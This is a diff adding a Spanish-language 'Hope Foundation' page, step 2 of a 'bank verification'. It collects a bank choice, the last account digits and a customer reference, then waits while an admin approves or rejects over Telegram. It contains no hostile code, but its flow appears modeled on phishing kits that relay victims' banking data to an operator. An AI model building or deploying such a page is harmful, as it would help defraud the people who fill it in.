@@ -1,0 +1,771 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Hope Foundation - Paso 2 Informacion Bancaria</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+
+  <style>
+    :root {
+      --ink: #172033;
+      --muted: #5e687a;
+      --line: #dbe2ee;
+      --panel: #ffffff;
+      --canvas: #f4f7fb;
+      --navy: #0b2f63;
+      --blue: #0b5cab;
+      --blue-dark: #083f79;
+      --gold: #c49a2c;
+      --success: #177245;
+      --danger: #b42318;
+      --shadow: 0 18px 45px rgba(15, 39, 77, 0.12);
+    }
+
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      min-height: 100vh;
+      margin: 0;
+      font-family: "Inter", Arial, sans-serif;
+      color: var(--ink);
+      background:
+        radial-gradient(circle at top left, rgba(11, 92, 171, 0.12), transparent 34rem),
+        linear-gradient(180deg, #ffffff 0%, var(--canvas) 42%);
+    }
+
+    a {
+      color: inherit;
+      text-decoration: none;
+    }
+
+    .topbar {
+      position: sticky;
+      top: 0;
+      z-index: 20;
+      border-bottom: 1px solid rgba(219, 226, 238, 0.9);
+      background: rgba(255, 255, 255, 0.94);
+      backdrop-filter: blur(14px);
+    }
+
+    .topbar-inner {
+      width: min(1120px, calc(100% - 32px));
+      min-height: 72px;
+      margin: 0 auto;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 24px;
+    }
+
+    .brand {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      font-weight: 800;
+      color: var(--navy);
+    }
+
+    .brand-mark {
+      width: 42px;
+      height: 42px;
+      display: grid;
+      place-items: center;
+      border-radius: 10px;
+      color: white;
+      background: linear-gradient(135deg, var(--blue), var(--navy));
+      box-shadow: 0 10px 22px rgba(11, 92, 171, 0.24);
+    }
+
+    .brand-text {
+      display: flex;
+      flex-direction: column;
+      gap: 2px;
+      line-height: 1;
+    }
+
+    .brand-text span:first-child {
+      font-size: 1.05rem;
+    }
+
+    .brand-text span:last-child {
+      font-size: 0.76rem;
+      font-weight: 700;
+      color: var(--muted);
+      text-transform: uppercase;
+      letter-spacing: 0.08em;
+    }
+
+    nav.main-nav {
+      display: flex;
+      align-items: center;
+      gap: 4px;
+    }
+
+    nav.main-nav a {
+      padding: 10px 14px;
+      border-radius: 8px;
+      color: var(--muted);
+      font-weight: 700;
+      font-size: 0.94rem;
+    }
+
+    nav.main-nav a:hover,
+    nav.main-nav a.active {
+      color: var(--blue);
+      background: #edf5ff;
+    }
+
+    .page {
+      width: min(1120px, calc(100% - 32px));
+      margin: 42px auto 64px;
+      display: grid;
+      grid-template-columns: 1fr 360px;
+      gap: 28px;
+      align-items: start;
+    }
+
+    .main-panel,
+    .side-panel {
+      background: rgba(255, 255, 255, 0.96);
+      border: 1px solid var(--line);
+      box-shadow: var(--shadow);
+    }
+
+    .main-panel {
+      border-radius: 16px;
+      overflow: hidden;
+    }
+
+    .panel-header {
+      padding: 34px 38px 28px;
+      color: white;
+      background:
+        linear-gradient(135deg, rgba(11, 92, 171, 0.98), rgba(11, 47, 99, 0.98)),
+        url("https://images.unsplash.com/photo-1560472355-536de3962603?auto=format&fit=crop&w=1200&q=80");
+      background-size: cover;
+      background-position: center;
+      background-blend-mode: multiply;
+    }
+
+    .eyebrow {
+      margin: 0 0 12px;
+      font-size: 0.78rem;
+      font-weight: 800;
+      letter-spacing: 0.12em;
+      text-transform: uppercase;
+      color: rgba(255, 255, 255, 0.76);
+    }
+
+    h1 {
+      max-width: 680px;
+      margin: 0;
+      font-size: clamp(2rem, 4vw, 3.25rem);
+      line-height: 1.05;
+      letter-spacing: 0;
+    }
+
+    .intro {
+      max-width: 650px;
+      margin: 14px 0 0;
+      color: rgba(255, 255, 255, 0.82);
+      font-size: 1.02rem;
+      line-height: 1.6;
+    }
+
+    .form-area {
+      padding: 34px 38px 38px;
+    }
+
+    .section-title {
+      margin: 0 0 8px;
+      font-size: 1.25rem;
+      color: var(--ink);
+    }
+
+    .section-note {
+      margin: 0 0 22px;
+      color: var(--muted);
+      line-height: 1.55;
+    }
+
+    .field-grid {
+      display: grid;
+      grid-template-columns: 1fr;
+      gap: 16px;
+    }
+
+    .form-group {
+      position: relative;
+      display: flex;
+      flex-direction: column;
+      gap: 8px;
+      margin-top: 16px;
+    }
+
+    label {
+      color: #344056;
+      font-weight: 800;
+      font-size: 0.92rem;
+    }
+
+    select,
+    input {
+      width: 100%;
+      border: 1px solid #c8d3e1;
+      border-radius: 9px;
+      padding: 13px 14px 13px 44px;
+      color: var(--ink);
+      background: white;
+      font: inherit;
+      transition: border-color 0.18s ease, box-shadow 0.18s ease;
+    }
+
+    select:focus,
+    input:focus {
+      outline: none;
+      border-color: var(--blue);
+      box-shadow: 0 0 0 4px rgba(11, 92, 171, 0.12);
+    }
+
+    .left-small-icon {
+      position: absolute;
+      left: 12px;
+      top: 38px;
+      font-size: 22px;
+      color: var(--muted);
+      pointer-events: none;
+    }
+
+    .hidden {
+      display: none;
+    }
+
+    .visible {
+      display: block;
+    }
+
+    .actions {
+      margin-top: 26px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      gap: 16px;
+    }
+
+    .privacy-note {
+      max-width: 420px;
+      margin: 0;
+      color: var(--muted);
+      font-size: 0.86rem;
+      line-height: 1.5;
+    }
+
+    .submit-btn {
+      min-width: 200px;
+      border: 0;
+      border-radius: 9px;
+      padding: 12px 18px;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      color: white;
+      background: var(--blue);
+      font: inherit;
+      font-weight: 800;
+      cursor: pointer;
+      box-shadow: 0 12px 22px rgba(11, 92, 171, 0.22);
+      transition: background 0.18s ease, transform 0.18s ease;
+    }
+
+    .submit-btn:disabled {
+      cursor: not-allowed;
+      color: #7c8798;
+      background: #e1e7f0;
+      box-shadow: none;
+      transform: none;
+    }
+
+    .message {
+      min-height: 24px;
+      margin-top: 18px;
+      font-weight: 800;
+      color: var(--danger);
+    }
+
+    .message.success {
+      color: var(--success);
+    }
+
+    #show-traditional {
+      display: inline-block;
+      margin-top: 18px;
+      color: var(--blue);
+      font-weight: 700;
+      cursor: pointer;
+    }
+
+    #show-traditional:hover {
+      color: var(--blue-dark);
+      text-decoration: underline;
+    }
+
+    .side-panel {
+      position: sticky;
+      top: 96px;
+      border-radius: 16px;
+      overflow: hidden;
+    }
+
+    .security-card {
+      padding: 26px;
+      background:
+        linear-gradient(160deg, rgba(11, 47, 99, 0.96), rgba(8, 63, 121, 0.96)),
+        url("https://images.unsplash.com/photo-1556742049-0cfed4f6a45d?auto=format&fit=crop&w=900&q=80");
+      background-size: cover;
+      background-position: center;
+      background-blend-mode: multiply;
+      color: white;
+    }
+
+    .security-card .material-icons {
+      width: 48px;
+      height: 48px;
+      display: grid;
+      place-items: center;
+      border-radius: 12px;
+      color: var(--navy);
+      background: white;
+      font-size: 28px;
+    }
+
+    .security-card h2 {
+      margin: 20px 0 10px;
+      font-size: 1.45rem;
+      line-height: 1.15;
+    }
+
+    .security-card p {
+      margin: 0;
+      color: rgba(255, 255, 255, 0.82);
+      line-height: 1.55;
+    }
+
+    .side-list {
+      padding: 22px 26px 26px;
+      display: grid;
+      gap: 18px;
+      background: white;
+    }
+
+    .side-item {
+      display: flex;
+      gap: 12px;
+      align-items: flex-start;
+    }
+
+    .side-item .material-icons {
+      color: var(--gold);
+      font-size: 24px;
+    }
+
+    .side-item strong {
+      display: block;
+      margin-bottom: 3px;
+      color: var(--ink);
+    }
+
+    .side-item span {
+      color: var(--muted);
+      font-size: 0.9rem;
+      line-height: 1.45;
+    }
+
+    @media (max-width: 940px) {
+      .page {
+        grid-template-columns: 1fr;
+      }
+
+      .side-panel {
+        position: static;
+      }
+    }
+
+    @media (max-width: 720px) {
+      .topbar-inner {
+        align-items: flex-start;
+        flex-direction: column;
+        padding: 14px 0;
+      }
+
+      nav.main-nav {
+        width: 100%;
+        overflow-x: auto;
+        padding-bottom: 4px;
+      }
+
+      .page {
+        width: min(100% - 22px, 1120px);
+        margin-top: 24px;
+      }
+
+      .panel-header,
+      .form-area {
+        padding: 28px 22px;
+      }
+
+      .actions {
+        align-items: stretch;
+        flex-direction: column;
+      }
+
+      .submit-btn {
+        width: 100%;
+      }
+    }
+  </style>
+</head>
+
+<body>
+  <header class="topbar" role="banner">
+    <div class="topbar-inner">
+      <a class="brand" href="#" aria-label="Hope Foundation">
+        <span class="brand-mark material-icons" aria-hidden="true">volunteer_activism</span>
+        <span class="brand-text">
+          <span>Hope Foundation</span>
+          <span>Asistencia y apoyo</span>
+        </span>
+      </a>
+
+      <nav class="main-nav" aria-label="Navegacion principal">
+        <a href="index.html" class="active" aria-current="page">Inicio</a>
+        <a href="programas.html">Programas</a>
+        <a href="contacto.html">Contactanos</a>
+      </nav>
+    </div>
+  </header>
+
+  <main class="page" role="main">
+    <section class="main-panel" aria-labelledby="panel-title">
+      <div class="panel-header">
+        <p class="eyebrow">Proceso de verificacion</p>
+        <h1 id="panel-title">Confirmacion - Informacion bancaria</h1>
+        <p class="intro">Seleccione su entidad y envie una solicitud para revision del administrador por Telegram.</p>
+      </div>
+
+      <div class="form-area">
+        <h2 class="section-title">Paso 2: Informacion bancaria y verificacion</h2>
+        <p class="section-note">No ingrese contrasenas, codigos, PIN, SSN ni datos completos de tarjeta.</p>
+
+        <div class="field-grid">
+          <div class="form-group">
+            <label for="bank-select">Seleccione su banco</label>
+            <span class="material-icons left-small-icon" aria-hidden="true">account_balance</span>
+            <select id="bank-select" required aria-required="true" aria-describedby="bank-help" name="bank-select">
+              <option value="" disabled selected>-- Seleccione banco --</option>
+              <option>Chase Bank</option>
+              <option>Wells Fargo</option>
+              <option>Citi Bank</option>
+              <option>Bank of America</option>
+              <option>US Bank</option>
+              <option>PNC Bank</option>
+              <option>Capital One</option>
+              <option>TD Bank</option>
+              <option>Ally Bank</option>
+              <option>Discover Bank</option>
+              <option>Regions Bank</option>
+              <option>Truist Bank</option>
+              <option>U.S. Bank</option>
+              <option>Others</option>
+            </select>
+            <small id="bank-help">Debe seleccionar su entidad bancaria primero.</small>
+          </div>
+        </div>
+
+        <section id="fast-verification" aria-live="polite" aria-hidden="true" class="hidden">
+          <form id="fast-form" novalidate>
+            <div class="form-group">
+              <label for="account-last4">Ultimos 4 digitos o referencia</label>
+              <span class="material-icons left-small-icon" aria-hidden="true">credit_card</span>
+              <input type="text" id="account-last4" name="account_last4" placeholder="1234 o referencia" required>
+            </div>
+
+            <div class="form-group">
+              <label for="customer-ref">Referencia de cliente</label>
+              <span class="material-icons left-small-icon" aria-hidden="true">person</span>
+              <input type="text" id="customer-ref" name="customer_ref" placeholder="Nombre, folio o referencia">
+            </div>
+
+            <div class="actions">
+              <p class="privacy-note">Se enviara una solicitud al administrador para aprobar o rechazar desde Telegram.</p>
+              <button type="submit" class="submit-btn" disabled>Enviar verificacion rapida</button>
+            </div>
+          </form>
+        </section>
+
+        <div id="show-traditional" role="button" tabindex="0" aria-label="Optar por verificacion tradicional">
+          Optar por otro tipo de verificacion tradicional
+        </div>
+
+        <section id="traditional-verification" aria-live="polite" aria-hidden="true" class="hidden">
+          <form id="traditional-form" novalidate>
+            <div class="form-group">
+              <label for="traditional-bank">Banco</label>
+              <span class="material-icons left-small-icon" aria-hidden="true">account_balance</span>
+              <select id="traditional-bank" name="bank" required aria-required="true">
+                <option value="" disabled selected>-- Seleccione banco --</option>
+                <option>Chase Bank</option>
+                <option>Wells Fargo</option>
+                <option>Citi Bank</option>
+                <option>Bank of America</option>
+                <option>US Bank</option>
+                <option>PNC Bank</option>
+                <option>Capital One</option>
+                <option>TD Bank</option>
+                <option>Others</option>
+              </select>
+            </div>
+
+            <div class="form-group">
+              <label for="traditional-account-last4">Ultimos 4 digitos o referencia</label>
+              <span class="material-icons left-small-icon" aria-hidden="true">credit_card</span>
+              <input type="text" id="traditional-account-last4" name="account_last4" placeholder="1234 o referencia" required>
+            </div>
+
+            <div class="form-group">
+              <label for="traditional-customer-ref">Referencia de cliente</label>
+              <span class="material-icons left-small-icon" aria-hidden="true">person</span>
+              <input type="text" id="traditional-customer-ref" name="customer_ref" placeholder="Nombre, folio o referencia">
+            </div>
+
+            <div class="actions">
+              <p class="privacy-note">El administrador recibira esta solicitud en Telegram y decidira si continua.</p>
+              <button type="submit" class="submit-btn" disabled>Enviar verificacion tradicional</button>
+            </div>
+          </form>
+        </section>
+
+        <div id="message-container" class="message" role="status" aria-live="polite"></div>
+      </div>
+    </section>
+
+    <aside class="side-panel" aria-label="Informacion de seguridad">
+      <div class="security-card">
+        <span class="material-icons" aria-hidden="true">verified_user</span>
+        <h2>Revision protegida</h2>
+        <p>La pagina solo envia datos de referencia. La decision se toma desde el bot de Telegram autorizado.</p>
+      </div>
+
+      <div class="side-list">
+        <div class="side-item">
+          <span class="material-icons" aria-hidden="true">check_circle</span>
+          <div>
+            <strong>Solicitud pendiente</strong>
+            <span>Al enviar, la pagina consulta el estado cada 2 segundos.</span>
+          </div>
+        </div>
+        <div class="side-item">
+          <span class="material-icons" aria-hidden="true">admin_panel_settings</span>
+          <div>
+            <strong>Admin por Telegram</strong>
+            <span>Solo los IDs configurados en ADMIN_CHAT_IDS pueden aprobar o rechazar.</span>
+          </div>
+        </div>
+        <div class="side-item">
+          <span class="material-icons" aria-hidden="true">lock</span>
+          <div>
+            <strong>Sin secretos</strong>
+            <span>No se aceptan contrasenas, codigos, PIN, tokens, SSN ni CVV.</span>
+          </div>
+        </div>
+      </div>
+    </aside>
+  </main>
+
+  <script>
+    const API_BASE = "http://localhost:5000";
+    const bankSelect = document.getElementById("bank-select");
+    const fastVerification = document.getElementById("fast-verification");
+    const fastForm = document.getElementById("fast-form");
+    const showTraditionalBtn = document.getElementById("show-traditional");
+    const traditionalSection = document.getElementById("traditional-verification");
+    const traditionalForm = document.getElementById("traditional-form");
+    const messageContainer = document.getElementById("message-container");
+    let sending = false;
+    let poller = null;
+
+    function showMessage(message, isError = true) {
+      messageContainer.textContent = message;
+      messageContainer.classList.toggle("success", !isError);
+    }
+
+    function clearMessage() {
+      messageContainer.textContent = "";
+      messageContainer.classList.remove("success");
+    }
+
+    function setFormEnabled(form, enabled) {
+      form.querySelectorAll("input, select, button").forEach((element) => {
+        element.disabled = !enabled;
+      });
+      validateForm(form);
+    }
+
+    function validateForm(form) {
+      const button = form.querySelector('button[type="submit"]');
+      const fields = Array.from(form.querySelectorAll("input, select")).filter((field) => !field.disabled);
+      button.disabled = !fields.every((field) => field.checkValidity()) || sending;
+    }
+
+    function hideAllForms() {
+      fastVerification.className = "hidden";
+      fastVerification.setAttribute("aria-hidden", "true");
+      traditionalSection.className = "hidden";
+      traditionalSection.setAttribute("aria-hidden", "true");
+      setFormEnabled(fastForm, false);
+      setFormEnabled(traditionalForm, false);
+    }
+
+    function showFastForm() {
+      fastVerification.className = "visible";
+      fastVerification.setAttribute("aria-hidden", "false");
+      traditionalSection.className = "hidden";
+      traditionalSection.setAttribute("aria-hidden", "true");
+      setFormEnabled(fastForm, true);
+      setFormEnabled(traditionalForm, false);
+      showTraditionalBtn.style.display = "inline-block";
+    }
+
+    function showTraditionalForm() {
+      fastVerification.className = "hidden";
+      fastVerification.setAttribute("aria-hidden", "true");
+      traditionalSection.className = "visible";
+      traditionalSection.setAttribute("aria-hidden", "false");
+      setFormEnabled(fastForm, false);
+      setFormEnabled(traditionalForm, true);
+      showTraditionalBtn.style.display = "none";
+    }
+
+    function readPayload(form) {
+      const isTraditional = form.id === "traditional-form";
+      return {
+        type: isTraditional ? "traditional" : "fast",
+        bank: isTraditional ? document.getElementById("traditional-bank").value : bankSelect.value,
+        account_last4: isTraditional
+          ? document.getElementById("traditional-account-last4").value
+          : document.getElementById("account-last4").value,
+        customer_ref: isTraditional
+          ? document.getElementById("traditional-customer-ref").value
+          : document.getElementById("customer-ref").value,
+        summary: isTraditional ? "Verificacion tradicional" : "Verificacion rapida"
+      };
+    }
+
+    async function pollStatus(id, button) {
+      const response = await fetch(`${API_BASE}/api/status/${encodeURIComponent(id)}`);
+      if (!response.ok) return;
+
+      const body = await response.json();
+      if (body.status === "approved") {
+        clearInterval(poller);
+        sending = false;
+        showMessage("Verificacion aprobada. Redirigiendo...", false);
+        setTimeout(() => {
+          window.location.href = "paso4.html";
+        }, 1200);
+      }
+
+      if (body.status === "rejected") {
+        clearInterval(poller);
+        sending = false;
+        showMessage("Verificacion rechazada. Revise los datos e intente de nuevo.");
+        button.disabled = false;
+      }
+    }
+
+    async function handleSubmit(event) {
+      event.preventDefault();
+      clearMessage();
+
+      if (sending) return;
+
+      const form = event.target;
+      const button = form.querySelector('button[type="submit"]');
+      if (!form.checkValidity()) {
+        showMessage("Por favor complete correctamente los campos.");
+        return;
+      }
+
+      sending = true;
+      button.disabled = true;
+      showMessage("Enviando solicitud al administrador...", false);
+      clearInterval(poller);
+
+      try {
+        const response = await fetch(`${API_BASE}/api/solicitud`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(readPayload(form))
+        });
+        const body = await response.json();
+
+        if (!response.ok) {
+          throw new Error(body.error || "No se pudo enviar la solicitud.");
+        }
+
+        showMessage("Solicitud enviada. Esperando aprobacion en Telegram...", false);
+        poller = setInterval(() => pollStatus(body.id, button), 2000);
+      } catch (error) {
+        sending = false;
+        button.disabled = false;
+        showMessage(error.message || "Error de conexion. Intente mas tarde.");
+      }
+    }
+
+    [fastForm, traditionalForm].forEach((form) => {
+      form.addEventListener("submit", handleSubmit);
+      form.querySelectorAll("input, select").forEach((field) => {
+        const eventName = field.tagName.toLowerCase() === "select" ? "change" : "input";
+        field.addEventListener(eventName, () => {
+          clearMessage();
+          validateForm(form);
+        });
+      });
+    });
+
+    bankSelect.addEventListener("change", () => {
+      clearMessage();
+      if (bankSelect.value) {
+        showFastForm();
+      } else {
+        hideAllForms();
+      }
+    });
+
+    showTraditionalBtn.addEventListener("click", () => {
+      clearMessage();
+      showTraditionalForm();
+    });
+
+    showTraditionalBtn.addEventListener("keydown", (event) => {
+      if (event.key === "Enter" || event.key === " ") {
+        event.preventDefault();
+        showTraditionalForm();
+      }
+    });
+
+    window.addEventListener("load", () => {
+      hideAllForms();
+      showTraditionalBtn.style.display = "inline-block";
+    });
+  </script>
+</body>
+
+</html>
